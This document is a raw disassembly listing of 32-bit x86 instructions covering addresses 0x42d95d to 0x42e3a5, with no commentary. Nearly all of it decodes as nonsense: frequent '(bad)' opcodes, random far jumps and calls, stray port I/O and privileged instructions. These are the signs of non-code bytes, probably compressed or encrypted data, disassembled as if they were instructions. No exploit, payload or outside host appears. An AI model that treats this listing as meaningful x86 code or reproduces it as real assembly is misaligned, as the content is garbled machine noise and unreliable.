  42d95d:	mov    al,0xd1
  42d95f:	fstp   TBYTE PTR [edi+0x4e220702]
  42d965:	nop
  42d966:	ja     0x42d942
  42d968:	leave  
  42d969:	cs mov dh,0xd5
  42d96c:	bound  eax,QWORD PTR [esi+0x2b392688]
  42d972:	rcl    DWORD PTR [ebx],0xd8
  42d975:	lds    edi,FWORD PTR ds:0x830675c4
  42d97b:	stos   BYTE PTR es:[edi],al
  42d97c:	add    al,0x1a
  42d97e:	xchg   ebp,eax
  42d97f:	and    edi,DWORD PTR [esp+eiz*8+0x49]
  42d983:	pop    ss
  42d984:	pop    ebx
  42d985:	test   al,0x5d
  42d987:	xchg   DWORD PTR [ebx+ebp*8],eax
  42d98a:	pusha  
  42d98b:	sub    eax,0xf70db517
  42d990:	fcmovu st,st(5)
  42d992:	sub    BYTE PTR [edx-0x3d],ch
  42d995:	push   edx
  42d996:	mov    edx,ebx
  42d998:	push   esi
  42d999:	enter  0xd4b6,0xda
  42d99d:	fsub   QWORD PTR [edi+ebx*4]
  42d9a0:	jmp    0x1ab7:0x87b35aa7
  42d9a7:	adc    eax,0x1f49b6e4
  42d9ac:	sbb    al,0x1f
  42d9ae:	sub    dl,dh
  42d9b0:	pop    eax
  42d9b1:	hlt    
  42d9b2:	sahf   
  42d9b3:	call   0x1461:0xdda9953a
  42d9ba:	push   eax
  42d9bb:	jo     0x42d97d
  42d9bd:	push   edx
  42d9be:	aam    0x67
  42d9c0:	aaa    
  42d9c1:	jp     0x42da26
  42d9c3:	into   
  42d9c4:	sub    BYTE PTR [ebx+0x4a247652],dl
  42d9ca:	out    dx,eax
  42d9cb:	and    ebx,DWORD PTR [edx]
  42d9cd:	inc    ebp
  42d9ce:	pop    ecx
  42d9cf:	or     BYTE PTR [ebx-0x68fe62eb],cl
  42d9d5:	inc    edx
  42d9d6:	xor    ebx,DWORD PTR [esi+0x20dc9967]
  42d9dc:	dec    edi
  42d9dd:	es pop es
  42d9df:	ds jb  0x42d9f8
  42d9e2:	push   ss
  42d9e3:	sbb    DWORD PTR [ebx],ebx
  42d9e5:	or     DWORD PTR [esi+ebx*4-0x75],edx
  42d9e9:	cmp    ah,BYTE PTR [edi]
  42d9eb:	mov    ds:0xe230,eax
	...
  42da54:	add    BYTE PTR [eax],al
  42da56:	stc    
  42da57:	mov    cl,0x70
  42da59:	dec    eax
  42da5a:	js     0x42da25
  42da5c:	stc    
  42da5d:	mov    cl,0xbf
  42da5f:	dec    edi
  42da60:	int    0xe1
  42da62:	and    al,0xb3
  42da64:	pop    eax
  42da65:	daa    
  42da66:	addr16 jmp 0x142da6d
  42da6c:	add    BYTE PTR [eax],al
  42da6e:	add    BYTE PTR [esi-0x4f18f516],al
  42da74:	or     cl,bh
  42da76:	and    DWORD PTR [ecx+0x64e658a3],ebp
  42da7c:	sbb    BYTE PTR [ebp*1+0x52e4e003],dh
  42da83:	inc    edi
  42da84:	mov    esi,0x26be416
  42da89:	push   cs
  42da8a:	out    0xb5,al
  42da8c:	js     0x42daf1
  42da8e:	sbb    BYTE PTR [edx+0x3a],ah
  42da91:	out    0x79,eax
  42da93:	das    
  42da94:	ss lock repz fs pop es
  42da99:	popa   
  42da9a:	cmp    ebp,edx
  42da9c:	jmp    0xdc9d:0x62ea9a5
  42daa3:	sub    BYTE PTR [ecx-0x43],bh
  42daa6:	mov    cl,0xb1
  42daa8:	lods   eax,DWORD PTR ds:[esi]
  42daa9:	sbb    cl,al
  42daab:	out    0xa,eax
  42daad:	xchg   edx,eax
  42daae:	mov    edi,0x599562b9
  42dab3:	js     0x42daed
  42dab5:	hlt    
  42dab6:	add    ch,BYTE PTR [esi]
  42dab8:	cmp    DWORD PTR [ecx],edi
  42daba:	cli    
  42dabb:	jb     0x42da4c
  42dabd:	leave  
  42dabe:	push   esi
  42dabf:	mov    bl,0x60
  42dac1:	sahf   
  42dac2:	sub    ebx,DWORD PTR [ebp-0x424bee33]
  42dac8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dac9:	pop    edx
  42daca:	es pusha 
  42dacc:	cdq    
  42dacd:	imul   esi,DWORD PTR [ecx-0x23],0x41
  42dad1:	mov    edi,0x77c354fa
  42dad6:	cld    
  42dad7:	adc    DWORD PTR [ebx-0x6753a8c1],ebx
  42dadd:	jo     0x42daab
  42dadf:	(bad)  
  42dae0:	and    eax,0xa634569e
  42dae5:	sub    ah,BYTE PTR [edx+0x436b1e97]
  42daeb:	fidivr WORD PTR [ecx]
  42daed:	fst    QWORD PTR [esi+0x16]
  42daf0:	loop   0x42daa3
  42daf2:	sbb    bl,dl
  42daf4:	adc    esp,ebx
  42daf6:	addr16 (bad) 
  42daf8:	cmp    esi,DWORD PTR [ecx+0x24]
  42dafb:	sbb    esi,DWORD PTR [ebx]
  42dafd:	xor    eax,0x2ba192f8
  42db02:	adc    DWORD PTR [edx+0x10],eax
  42db05:	popa   
  42db06:	adc    BYTE PTR ds:0x8e08772d,0x8f
  42db0d:	inc    eax
  42db0e:	dec    ebp
  42db0f:	mov    ebx,0xd2239e96
  42db14:	push   ebx
  42db15:	push   ebx
  42db16:	and    al,0x6c
  42db18:	fist   DWORD PTR [esi-0x51dfe610]
  42db1e:	lods   al,BYTE PTR ds:[esi]
  42db1f:	mov    eax,0x5a6a108a
  42db24:	add    BYTE PTR [ecx],0xeb
  42db27:	and    DWORD PTR ds:0x64067d6c,ebx
  42db2d:	jge    0x42dafd
  42db2f:	out    0xed,al
  42db31:	ds stos BYTE PTR es:[edi],al
  42db33:	mov    al,0xe9
  42db35:	or     BYTE PTR [eax],ch
  42db37:	mov    bl,0x2e
  42db39:	icebp  
  42db3a:	jg     0x42dac7
  42db3c:	out    dx,eax
  42db3d:	and    bh,BYTE PTR [esi]
  42db3f:	mov    ah,0x2f
  42db41:	mov    bh,0x8c
  42db43:	outs   dx,BYTE PTR gs:[esi]
  42db45:	inc    edx
  42db46:	mov    ah,0x2c
  42db48:	or     ah,BYTE PTR [ecx-0x2d57167a]
  42db4e:	jl     0x42db83
  42db50:	jno    0x42dbd1
  42db52:	xor    BYTE PTR [edi+0x52],0x48
  42db56:	popf   
  42db57:	movq   mm5,QWORD PTR [ebx]
  42db5a:	(bad)  
  42db5b:	ret    0xebfa
  42db5e:	sti    
  42db5f:	mov    bh,0xdd
  42db61:	mov    dl,0x5c
  42db63:	jmp    0x155e:0x95a510d8
  42db6a:	(bad)  
  42db6b:	mov    BYTE PTR [ebx+0x77],ch
	...
  42dbd6:	mov    al,0x7a
  42dbd8:	pop    ds
  42dbd9:	ins    BYTE PTR es:[edi],dx
  42dbda:	fild   QWORD PTR [ebp-0xd]
  42dbdd:	(bad)  
  42dbde:	fwait
  42dbdf:	jns    0x42db7c
  42dbe1:	jns    0x42dc32
  42dbe3:	(bad)  
  42dbe5:	repnz addr16 jmp 0x0:0x1000001
  42dbee:	mov    eax,ds:0xd8f5f7f0
  42dbf3:	in     eax,dx
  42dbf4:	sbb    al,0x56
  42dbf6:	(bad)  
  42dbf7:	cli    
  42dbf8:	cld    
  42dbf9:	sar    DWORD PTR [esp+esi*4-0x5b5a4c71],0x82
  42dc01:	ficom  DWORD PTR [ecx]
  42dc03:	inc    ebp
  42dc04:	mov    ebx,0xf2221473
  42dc09:	(bad)  [ebp-0x3f]
  42dc0c:	mov    esp,0x27005564
  42dc11:	mov    dl,0x4c
  42dc13:	popa   
  42dc14:	test   al,0x89
  42dc16:	fidiv  DWORD PTR [esi-0x19]
  42dc19:	dec    edx
  42dc1a:	gs xchg esi,eax
  42dc1c:	add    al,0x5
  42dc1e:	bts    DWORD PTR [ebp+ecx*1+0x285d8d7c],eax
  42dc26:	jne    0x42dc16
  42dc28:	cmp    al,0x77
  42dc2a:	cmp    DWORD PTR ds:0x789fe309,edi
  42dc30:	fisubr WORD PTR [edi+0x61]
  42dc33:	mov    esp,0x2af04c57
  42dc38:	adc    ecx,DWORD PTR ds:0x830ad436
  42dc3e:	sbb    bl,BYTE PTR [ecx-0x4d46847a]
  42dc44:	cmp    edi,DWORD PTR [ebp+0x208a1ec3]
  42dc4a:	inc    edi
  42dc4b:	inc    esp
  42dc4c:	ud0    ebx,ebx
  42dc4f:	dec    edi
  42dc50:	fcomp  st(6)
  42dc52:	fs dec eax
  42dc54:	dec    esi
  42dc55:	mov    eax,ds:0xd952e611
  42dc5a:	xlat   BYTE PTR ds:[ebx]
  42dc5b:	mov    ecx,DWORD PTR [edi]
  42dc5d:	xchg   BYTE PTR [eax],dl
  42dc5f:	push   ebp
  42dc60:	test   eax,0x3f0c071a
  42dc65:	cwde   
  42dc66:	sbb    ah,bh
  42dc68:	ds mov ch,0x68
  42dc6b:	int    0x7f
  42dc6d:	lea    esi,[eax+ecx*1-0x21e0af05]
  42dc74:	arpl   WORD PTR [edi-0x3f],bx
  42dc77:	ds out dx,eax
  42dc79:	inc    ebp
  42dc7a:	mov    cl,0x77
  42dc7c:	sub    dh,BYTE PTR [edx]
  42dc7e:	loopne 0x42dc60
  42dc80:	jecxz  0x42dc2c
  42dc82:	mov    DWORD PTR [ebp-0x108fd463],edx
  42dc88:	cmp    DWORD PTR [edi],0x24
  42dc8b:	(bad)  
  42dc8c:	icebp  
  42dc8d:	add    eax,0x95e40906
  42dc92:	or     DWORD PTR [ebx],eax
  42dc94:	mov    ecx,0xa048d853
  42dc99:	mov    ecx,0x78d46fbd
  42dc9e:	in     eax,0xac
  42dca0:	les    esi,FWORD PTR [ebp-0x54a55395]
  42dca6:	int    0xc0
  42dca8:	or     DWORD PTR [esi-0x55567430],ecx
  42dcae:	shr    DWORD PTR [ecx+0x2b826e3a],1
  42dcb4:	push   eax
  42dcb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dcb6:	mov    edi,0xf91c4a8e
  42dcbb:	scas   eax,DWORD PTR es:[edi]
  42dcbc:	(bad)  
  42dcbd:	xor    DWORD PTR [eax-0x18],edi
  42dcc0:	mov    DWORD PTR [edi+0x3f6e9f8c],0xd46af4bd
  42dcca:	retf   0xdcc
  42dccd:	xchg   ebp,eax
  42dcce:	fist   WORD PTR [eax+0x2a]
  42dcd1:	div    BYTE PTR [edx]
  42dcd3:	inc    esi
  42dcd4:	xchg   ecx,eax
  42dcd5:	loop   0x42dc60
  42dcd7:	cwde   
  42dcd8:	ja     0x42dca7
  42dcda:	jl     0x42dcc6
  42dcdc:	push   ebx
  42dcdd:	sub    al,dl
  42dcdf:	mov    ebp,?
  42dce1:	or     al,0xb9
  42dce3:	push   ebp
  42dce4:	out    dx,eax
  42dce5:	cmp    bl,BYTE PTR [edi+esi*4]
  42dce8:	jae    0x42dcf3
  42dcea:	xor    BYTE PTR [ebx-0x3b],bl
  42dced:	and    BYTE PTR [eax],al
	...
  42dd53:	add    BYTE PTR [eax],al
  42dd55:	add    BYTE PTR [ecx],bh
  42dd57:	mov    bh,0x6d
  42dd59:	pxor   mm3,mm7
  42dd5c:	jnp    0x42dd15
  42dd5e:	adc    BYTE PTR [eax],ch
  42dd60:	jne    0x42dd48
  42dd62:	jp     0x42dd9b
  42dd64:	test   BYTE PTR [edi+eiz*2],0xeb
  42dd68:	add    DWORD PTR [eax],eax
  42dd6a:	add    BYTE PTR [ecx],al
  42dd6c:	add    BYTE PTR [eax],al
  42dd6e:	push   0xa8c5d1d6
  42dd73:	ret    0x6646
  42dd76:	int3   
  42dd77:	pop    eax
  42dd78:	dec    ecx
  42dd79:	out    dx,al
  42dd7a:	lahf   
  42dd7b:	aam    0x35
  42dd7d:	mov    al,ds:0x7ae767ba
  42dd82:	sbb    DWORD PTR [ebx-0x39],0x93b168fd
  42dd89:	sub    al,0x35
  42dd8b:	lds    eax,FWORD PTR [edx]
  42dd8d:	aaa    
  42dd8e:	test   BYTE PTR [ebx],bl
  42dd90:	cs in  eax,0x56
  42dd93:	jb     0x42dda5
  42dd95:	ins    BYTE PTR es:[edi],dx
  42dd96:	pop    ebp
  42dd97:	lds    esp,FWORD PTR [ecx+0xe]
  42dd9a:	adc    bl,BYTE PTR [ebx+0x6c]
  42dd9d:	test   al,0xee
  42dd9f:	xor    esp,DWORD PTR [edx+esi*4]
  42dda2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dda3:	jge    0x42dd91
  42dda5:	cmp    eax,0x20f61bd4
  42ddaa:	out    0xd0,eax
  42ddac:	mov    al,0xfa
  42ddae:	into   
  42ddaf:	imul   esi,DWORD PTR [esi-0x63],0xffffff8a
  42ddb3:	xor    DWORD PTR [esi+0x6c874f72],0xffffffc3
  42ddba:	push   ds
  42ddbb:	sbb    al,BYTE PTR [ebx-0x6bf8cff9]
  42ddc1:	cmp    eax,0x1154d267
  42ddc6:	iret   
  42ddc7:	daa    
  42ddc8:	sar    BYTE PTR [edx+0x14ea98],0xa0
  42ddcf:	in     eax,0x2
  42ddd1:	fdivr  DWORD PTR [edx]
  42ddd3:	pop    ds
  42ddd4:	or     DWORD PTR [eax-0x7d],ebp
  42ddd7:	lods   al,BYTE PTR ds:[esi]
  42ddd8:	stc    
  42ddd9:	test   bl,0x55
  42dddc:	out    dx,eax
  42dddd:	or     al,0x0
  42dddf:	jmp    0x1ac6:0x99f902ad
  42dde6:	fimul  DWORD PTR [esi-0x6fe7c9e5]
  42ddec:	sub    DWORD PTR [ebp+0x11],eax
  42ddef:	cs ret 
  42ddf1:	jp     0x42de71
  42ddf3:	inc    ecx
  42ddf4:	fisttp DWORD PTR [eax]
  42ddf6:	les    ebx,FWORD PTR [ecx+0xb]
  42ddf9:	jo     0x42de32
  42ddfb:	push   ebx
  42ddfc:	mov    dh,0xc5
  42ddfe:	mov    dh,BYTE PTR [ebx]
  42de00:	loopne 0x42ddc4
  42de02:	ret    0xe1fe
  42de05:	les    ebx,FWORD PTR [ebp-0x4a424bed]
  42de0b:	xchg   ebx,eax
  42de0c:	and    dl,cl
  42de0e:	lahf   
  42de0f:	not    DWORD PTR [esi-0x7d38f7db]
  42de15:	daa    
  42de16:	jmp    0xd470:0x3addc96f
  42de1d:	add    al,0x6e
  42de1f:	neg    al
  42de21:	xor    edi,DWORD PTR [esi]
  42de23:	adc    ebp,DWORD PTR [edi+0xc]
  42de26:	rcl    BYTE PTR [edx],0x8c
  42de29:	lods   eax,DWORD PTR ds:[esi]
  42de2a:	stos   DWORD PTR es:[edi],eax
  42de2b:	shl    BYTE PTR [esi-0xc],0x96
  42de2f:	xor    al,0x5b
  42de31:	pushf  
  42de32:	jno    0x42de88
  42de34:	mov    eax,ds:0xfc31199f
  42de39:	shr    BYTE PTR [edi-0x675c25fb],cl
  42de3f:	fwait
  42de40:	ret    0x9d86
  42de43:	jmp    0xf22f:0x74ad3c51
  42de4a:	mov    bh,0xd5
  42de4c:	sub    BYTE PTR [ebx+0x20],bl
  42de4f:	div    DWORD PTR ds:[ecx+0x411b31ee]
  42de56:	ja     0x42de70
  42de58:	ss mov ebp,0x617329b7
  42de5e:	xor    DWORD PTR [ebx+0x15],0x823a14f1
  42de65:	sar    BYTE PTR [edi],cl
  42de67:	(bad)  
  42de69:	jo     0x42de7c
  42de6b:	les    ecx,FWORD PTR [ecx]
  42de6d:	or     BYTE PTR [eax],al
	...
  42ded3:	add    BYTE PTR [eax],al
  42ded5:	add    dh,ah
  42ded7:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42dede:	fist   DWORD PTR [ebp-0x79]
  42dee1:	das    
  42dee2:	mov    al,0xcd
  42dee4:	mov    ebx,0x1ec6768
  42dee9:	add    BYTE PTR [eax],al
  42deeb:	add    DWORD PTR [eax],eax
  42deed:	add    BYTE PTR [esi+0x1e1e0f1a],al
  42def3:	out    0x51,al
  42def5:	adc    DWORD PTR [esp+eiz*8+0x664493fd],edx
  42defc:	inc    esp
  42defd:	in     al,0x5
  42deff:	and    eax,0x6f0c4728
  42df04:	adc    bl,0x52
  42df07:	inc    esi
  42df08:	mov    ecx,esp
  42df0a:	cmp    DWORD PTR [esi-0x78b86a0b],edi
  42df10:	add    al,0x1f
  42df12:	leave  
  42df13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42df14:	mov    eax,0x2698ee16
  42df19:	enter  0x608b,0x98
  42df1d:	dec    edx
  42df1e:	fild   WORD PTR [ebx]
  42df20:	not    BYTE PTR ds:0x4cde7517
  42df26:	imul   eax,DWORD PTR [edx+eax*8+0x16],0x70160911
  42df2e:	popf   
  42df2f:	in     al,0x8b
  42df31:	push   ds
  42df32:	mov    ch,0xb0
  42df34:	pushf  
  42df35:	jp     0x42df16
  42df37:	adc    eax,0x1776967
  42df3c:	add    dl,ch
  42df3e:	sti    
  42df3f:	cmp    bl,BYTE PTR [eax-0x3d]
  42df42:	or     edx,DWORD PTR [esp+edx*4+0xb7e1b57]
  42df49:	sbb    BYTE PTR [ebx],ch
  42df4b:	pop    DWORD PTR [esi-0x2240af6f]
  42df51:	pop    esp
  42df52:	xor    DWORD PTR [edx-0x6b8007c9],esp
  42df58:	sub    cl,0x4d
  42df5b:	add    eax,0xb8976300
  42df60:	pushf  
  42df61:	pusha  
  42df62:	clc    
  42df63:	ss cld 
  42df65:	fcom   DWORD PTR [ecx-0x62]
  42df68:	and    dh,cl
  42df6a:	leave  
  42df6b:	cmp    edi,edx
  42df6d:	shl    ecx,0x1c
  42df70:	adc    al,0x94
  42df72:	push   edx
  42df73:	jp     0x42dfce
  42df75:	and    DWORD PTR [eax],ebx
  42df77:	push   cs
  42df78:	xchg   DWORD PTR [edi+0x33eaf5ff],esp
  42df7e:	in     eax,0xe2
  42df80:	mov    ecx,0xbb7f27fd
  42df85:	repnz sbb DWORD PTR [ecx],0x8e68d657
  42df8c:	push   ebx
  42df8d:	dec    DWORD PTR [ecx-0x24]
  42df90:	push   es
  42df91:	mov    bh,0x7d
  42df93:	in     al,0xd2
  42df95:	je     0x42df57
  42df97:	mov    al,ds:0x4283760a
  42df9c:	std    
  42df9d:	cmp    eax,DWORD PTR [ecx]
  42df9f:	lea    esp,[ebp+esi*2-0x53]
  42dfa3:	cmp    ah,BYTE PTR ds:[esi]
  42dfa6:	ffree  st(1)
  42dfa8:	jmp    0x352f:0x41cdfbfe
  42dfaf:	in     eax,0xbd
  42dfb1:	fucomip st,st(2)
  42dfb3:	add    edi,DWORD PTR [edx-0x6b]
  42dfb6:	rcr    BYTE PTR [ebx-0x1bd0887c],0x99
  42dfbd:	pop    esi
  42dfbe:	add    al,0xd
  42dfc0:	sbb    al,0x4
  42dfc2:	hlt    
  42dfc3:	jl     0x42df4b
  42dfc5:	mov    edx,0xc9c3e419
  42dfca:	mov    ss,WORD PTR [ecx+0x42]
  42dfcd:	out    0x48,eax
  42dfcf:	cmp    BYTE PTR [eax+0x5b],ch
  42dfd2:	loope  0x42df95
  42dfd4:	popa   
  42dfd5:	popa   
  42dfd6:	sbb    BYTE PTR ds:0x413b2b24,bl
  42dfdc:	pop    esi
  42dfdd:	push   edi
  42dfde:	mov    ah,0xdd
  42dfe0:	retf   0xa8d1
  42dfe3:	sbb    BYTE PTR [edi+eiz*8],ch
  42dfe6:	sbb    DWORD PTR [ebx+0x7802492a],edi
  42dfec:	cs mov ecx,0x0
	...
  42e056:	add    bh,dh
  42e058:	jb     0x42e000
  42e05a:	(bad)  
  42e05b:	scas   al,BYTE PTR es:[edi]
  42e05c:	(bad)  
  42e05d:	dec    BYTE PTR [edi-0x30]
  42e060:	fisttp WORD PTR [esi+0x5f]
  42e063:	sub    ah,BYTE PTR [ebp+0x1ed6700]
  42e069:	add    BYTE PTR [eax],al
  42e06b:	add    DWORD PTR [eax],eax
  42e06d:	add    BYTE PTR [ebx-0x8],dh
  42e070:	(bad)  
  42e072:	push   ss
  42e073:	mov    al,ds:0x30893a20
  42e078:	clc    
  42e079:	pop    ds
  42e07a:	or     ah,BYTE PTR [esi]
  42e07c:	pushf  
  42e07d:	lock push edx
  42e07f:	mov    dl,0x52
  42e081:	mov    ebp,0x9ff92eb5
  42e086:	int3   
  42e087:	(bad)  
  42e088:	in     eax,dx
  42e089:	fldenv [ebp-0x1dc2ae26]
  42e08f:	sbb    DWORD PTR [eax+0x56],0xffffffed
  42e093:	cwde   
  42e094:	retf   
  42e095:	push   ecx
  42e096:	lea    ebp,[ebp+0x1e4c17f2]
  42e09c:	sbb    bh,BYTE PTR [edi]
  42e09e:	inc    ebp
  42e09f:	pop    edi
  42e0a0:	in     al,0x28
  42e0a2:	mov    ah,0x2b
  42e0a4:	push   edx
  42e0a5:	inc    edi
  42e0a6:	scas   eax,DWORD PTR es:[edi]
  42e0a7:	cdq    
  42e0a8:	pop    es
  42e0a9:	dec    ecx
  42e0aa:	mov    dh,0xd1
  42e0ac:	sub    BYTE PTR [ebp+0x4834cd4b],dh
  42e0b2:	je     0x42e050
  42e0b4:	cs mov ch,0x8
  42e0b7:	jo     0x42e0a3
  42e0b9:	mov    eax,ds:0xf8ca123d
  42e0be:	inc    ecx
  42e0bf:	lock ret 0x86c4
  42e0c3:	push   ss
  42e0c4:	(bad)  
  42e0c5:	ss inc eax
  42e0c7:	mov    cl,0xaa
  42e0c9:	ret    
  42e0ca:	dec    esp
  42e0cb:	pop    ss
  42e0cc:	xchg   ecx,eax
  42e0cd:	fwait
  42e0ce:	xor    BYTE PTR [ebx],dh
  42e0d0:	fst    DWORD PTR [ebx]
  42e0d2:	call   0x7a3f497f
  42e0d7:	test   al,0xfc
  42e0d9:	ror    BYTE PTR [edx],cl
  42e0db:	mov    cl,0x3e
  42e0dd:	popa   
  42e0de:	mov    ds:0xd87331fb,eax
  42e0e3:	enter  0x943,0x95
  42e0e7:	outs   dx,DWORD PTR ds:[esi]
  42e0e8:	push   cs
  42e0e9:	pop    eax
  42e0ea:	shr    BYTE PTR [eax-0x36],1
  42e0ed:	mov    ebp,0x5fa63de4
  42e0f2:	aam    0x7e
  42e0f4:	js     0x42e0dd
  42e0f6:	popf   
  42e0f7:	sahf   
  42e0f8:	inc    ebx
  42e0f9:	lea    edi,[ebx+0x4f05d19]
  42e0ff:	pop    ebx
  42e100:	bound  eax,QWORD PTR [ebp+0xc]
  42e103:	pop    ss
  42e104:	nop
  42e105:	(bad)  
  42e107:	out    dx,eax
  42e108:	retf   
  42e109:	ret    0xfadb
  42e10c:	rol    ch,cl
  42e10e:	nop
  42e10f:	std    
  42e110:	ret    0xf805
  42e113:	loop   0x42e180
  42e115:	ja     0x42e0eb
  42e117:	stos   BYTE PTR es:[edi],al
  42e118:	jl     0x42e133
  42e11a:	push   edx
  42e11b:	push   edx
  42e11c:	adc    BYTE PTR [edx-0x68],bl
  42e11f:	inc    eax
  42e120:	sar    BYTE PTR [edi-0x10],1
  42e123:	mov    WORD PTR ds:0x7a752253,gs
  42e129:	div    DWORD PTR [esi]
  42e12b:	jmp    0x4fee:0x402798b0
  42e132:	fadd   st(3),st
  42e134:	push   edi
  42e135:	pop    ebp
  42e136:	retf   
  42e137:	cmp    BYTE PTR [esi+0x3cb45b1c],ch
  42e13d:	ret    
  42e13e:	sar    DWORD PTR [ecx+0x23],1
  42e141:	pop    esp
  42e142:	icebp  
  42e143:	leave  
  42e144:	xor    BYTE PTR [edx],0x91
  42e147:	shl    BYTE PTR [edx],0xc0
  42e14a:	or     BYTE PTR [eax+0x2],al
  42e14d:	xchg   ecx,eax
  42e14e:	mov    edx,0x73f9dcbf
  42e153:	(bad)  
  42e154:	mov    al,ds:0xe3ca7937
  42e159:	pop    ecx
  42e15a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e15b:	retf   
  42e15c:	dec    esi
  42e15d:	out    0x7b,eax
  42e15f:	inc    eax
  42e160:	shr    BYTE PTR [ebp+0x72],cl
  42e163:	(bad)  
  42e164:	out    0xa0,al
  42e166:	fdiv   QWORD PTR [edi+0x6f]
  42e169:	outs   dx,BYTE PTR ds:[esi]
  42e16a:	mov    DWORD PTR [esi+ecx*2],esp
  42e16d:	push   edi
	...
  42e1d6:	mov    eax,ds:0x7e061ecf
  42e1db:	xlat   BYTE PTR ds:[ebx]
  42e1dc:	mov    ecx,0x35bb80ef
  42e1e1:	xchg   edi,eax
  42e1e2:	dec    esp
  42e1e3:	xchg   ebx,eax
  42e1e4:	dec    DWORD PTR [eax+0x67]
  42e1e7:	out    dx,al
  42e1e8:	add    DWORD PTR [eax],eax
  42e1ea:	add    BYTE PTR [ecx],al
  42e1ec:	add    BYTE PTR [eax],al
  42e1ee:	popf   
  42e1ef:	cli    
  42e1f0:	test   eax,0x71228864
  42e1f5:	xchg   ebp,eax
  42e1f6:	in     al,0xbb
  42e1f8:	xor    BYTE PTR [ecx-0x440bf2b2],cl
  42e1fe:	pop    esp
  42e1ff:	push   ecx
  42e200:	adc    eax,DWORD PTR [esi+ebx*4+0x4ef1ddc4]
  42e207:	stos   DWORD PTR es:[edi],eax
  42e208:	test   bh,cl
  42e20a:	mov    al,0xa2
  42e20c:	sbb    esi,DWORD PTR [ebx+0x23]
  42e20f:	out    dx,al
  42e210:	xchg   ebp,eax
  42e211:	loope  0x42e1c8
  42e213:	clc    
  42e214:	daa    
  42e215:	call   0xeae7:0x58dfb638
  42e21c:	push   ss
  42e21d:	fmul   DWORD PTR [ebp-0x57b43f7b]
  42e223:	cmp    al,0xd3
  42e225:	jbe    0x42e1bb
  42e227:	dec    esp
  42e228:	pop    edx
  42e229:	mov    al,ds:0x7bd33350
  42e22e:	sbb    eax,0x43e4c4d1
  42e233:	imul   esp,DWORD PTR [ebx+0x19],0x77b99927
  42e23a:	jge    0x42e24b
  42e23c:	and    DWORD PTR [edi-0x5e],esi
  42e23f:	push   cs
  42e240:	scas   al,BYTE PTR es:[edi]
  42e241:	loop   0x42e278
  42e243:	fist   WORD PTR [edx+0xa]
  42e246:	ret    0xc68a
  42e249:	jle    0x42e240
  42e24b:	pop    eax
  42e24c:	mov    ?,WORD PTR [esi]
  42e24e:	add    eax,0x16f8d7b5
  42e253:	mov    gs,edx
  42e255:	clc    
  42e256:	mov    WORD PTR [edi+ebx*2-0x3a16b73e],cs
  42e25d:	push   cs
  42e25e:	mov    al,ds:0xfd58e70a
  42e263:	jle    0x42e253
  42e265:	xor    BYTE PTR [eax+esi*4-0x7e0ddd49],cl
  42e26c:	shl    BYTE PTR [edx+edi*2],1
  42e26f:	push   esi
  42e270:	cwde   
  42e271:	sub    al,0x44
  42e273:	xchg   edx,eax
  42e274:	mov    esi,eax
  42e276:	cdq    
  42e277:	pop    ds
  42e278:	pop    ecx
  42e279:	stos   DWORD PTR es:[edi],eax
  42e27a:	shl    BYTE PTR [edx+ebx*1-0x1e4c7c4b],0xf3
  42e282:	mov    WORD PTR [eax],ds
  42e284:	jle    0x42e25d
  42e286:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e287:	mov    cl,0x24
  42e289:	xor    DWORD PTR [edx+esi*4+0x449ffc9c],ebx
  42e290:	aas    
  42e291:	inc    ebx
  42e292:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e294:	mov    ds:0x89d9f3fa,eax
  42e299:	push   ebx
  42e29a:	push   ds
  42e29b:	hlt    
  42e29c:	repnz mov edi,es
  42e29f:	adc    eax,0xe5b2372b
  42e2a4:	add    dh,0x97
  42e2a7:	outs   dx,BYTE PTR ds:[esi]
  42e2a8:	sti    
  42e2a9:	sbb    eax,0x33f729e0
  42e2ae:	and    BYTE PTR [ebp-0x1576d97c],0x44
  42e2b5:	js     0x42e2c9
  42e2b7:	js     0x42e2f6
  42e2b9:	and    edx,DWORD PTR [eax-0x15e88d7d]
  42e2bf:	(bad)  
  42e2c1:	scas   eax,DWORD PTR es:[edi]
  42e2c2:	add    dl,dh
  42e2c4:	imul   edx,DWORD PTR [ebx],0x992f6741
  42e2ca:	hlt    
  42e2cb:	push   es
  42e2cc:	push   edi
  42e2cd:	or     eax,0x282dea5b
  42e2d2:	lods   eax,DWORD PTR ds:[esi]
  42e2d3:	xor    bl,dl
  42e2d5:	pop    ecx
  42e2d6:	cmp    edx,ebp
  42e2d8:	ds cdq 
  42e2da:	outs   dx,DWORD PTR ds:[esi]
  42e2db:	dec    eax
  42e2dc:	jb     0x42e264
  42e2de:	leave  
  42e2df:	test   DWORD PTR [ebx],edx
  42e2e1:	pop    edx
  42e2e2:	xor    eax,0x2668aa79
  42e2e7:	loop   0x42e2c7
  42e2e9:	jl     0x42e26b
  42e2eb:	xor    eax,DWORD PTR [edi+edx*1+0x0]
	...
  42e353:	add    BYTE PTR [eax],al
  42e355:	add    BYTE PTR [ebp-0x655875c3],ch
  42e35b:	mov    bh,0xad
  42e35d:	aas    
  42e35e:	mov    ebx,0x1f199140
  42e363:	xlat   BYTE PTR ds:[ebx]
  42e364:	add    dl,BYTE PTR [ecx]
  42e366:	addr16 out dx,eax
  42e368:	add    DWORD PTR [eax],eax
  42e36a:	add    BYTE PTR [ecx],al
  42e36c:	add    BYTE PTR [eax],al
  42e36e:	gs cmp ecx,edx
  42e371:	lods   al,BYTE PTR ds:[esi]
  42e372:	es lahf 
  42e374:	inc    eax
  42e375:	data16 arpl WORD PTR [edi-0x516f43a2],sp
  42e37c:	mov    WORD PTR ds:0xe10132f1,ds
  42e382:	cmp    al,0x8a
  42e384:	push   ebx
  42e385:	sub    BYTE PTR [ecx-0x6c],ch
  42e388:	(bad)  [esi-0x5cc220df]
  42e38e:	gs dec ecx
  42e390:	push   0xbb4123b5
  42e395:	pop    ebx
  42e396:	bound  esp,QWORD PTR [ebp-0x6f]
  42e399:	icebp  
  42e39a:	jg     0x42e39a
  42e39c:	(bad)  
  42e39d:	pop    ss
  42e39e:	repnz mov esp,DWORD PTR [ebx+0x2a]
  42e3a2:	(bad)  
  42e3a3:	and    al,0x40
  42e3a5:	ror    BYTE PTR [ebp-0x235ea837],1
